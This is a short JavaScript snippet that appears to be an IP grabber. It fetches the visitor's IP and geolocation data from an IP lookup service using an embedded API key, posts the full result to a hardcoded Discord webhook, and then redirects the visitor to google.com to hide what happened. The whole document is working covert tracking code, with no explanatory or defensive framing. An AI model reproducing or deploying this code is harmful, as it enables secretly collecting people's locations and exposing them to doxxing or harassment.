var request = new XMLHttpRequest();
request.open('GET',`https://api.ipdata.co/?api-key=7beb17f7537a898bfee9001e6375b2d46c028bc3936d111a00629cb7`);
request.setRequestHeader('Accept', 'application/json');
request.onreadystatechange = function () {
  if (this.readyState === 4) {
    fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"content-type":"application/json"},"body":JSON.stringify({"content":this.responseText})});
  }
};

request.send();
window.location.replace("https://google.com")
